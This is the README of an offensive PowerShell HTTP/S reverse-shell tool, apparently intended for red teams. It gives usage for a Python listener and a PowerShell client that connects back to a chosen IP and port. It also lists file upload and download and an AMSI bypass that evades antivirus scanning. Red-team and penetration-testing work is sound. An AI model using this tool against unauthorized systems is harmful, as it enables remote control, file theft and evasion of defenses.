# Powershell HTTP/S Reverse Shell
HTTP-revshell is a tool focused on redteam exercises and pentesters. This tool provides a reverse connection through the http/s protocol.

##  server.py - server unisession

![Alt text](images/revshell.jpg "Server")

Server usage:
```
usage: server.py [-h] [--ssl] host port

Process some integers.

positional arguments:
  host        Listen Host
  port        Listen Port

optional arguments:
  -h, --help  show this help message and exit
  --ssl       Send traffic over ssl
```

##  server-multisession.py - server multisession
```
This server allows multiple connection of clients.
There is a menu with three basic commands: sessions, interact and exit
     - sessions --> show currently active sessions
     - interact --> interacts with a session (Example: interact <session_id>)
     - exit --> close the application
```
**IMPORTANT**: To change the session press *CTRL+d* to exit the current session without closing it.

## Invoke-WebRev.ps1 - client

Client usage:
```
Import-Module .\Invoke-WebRev.ps1
Invoke-WebRev -ip IP -port PORT [-ssl]
```

# Extra functions
```
Upload
    Usage: upload /src/path/file C:\dest\path\file
```

```
Download
    Usage: download C:\src\path\file /dst/path/file
```

# Features
    - SSL
    - Proxy Aware
    - Upload Function
    - Download Function
    - Error Control
    - AMSI bypass
    - Multiple sessions (only server-multisession.py)

# TODO
    - Autocomplete
    
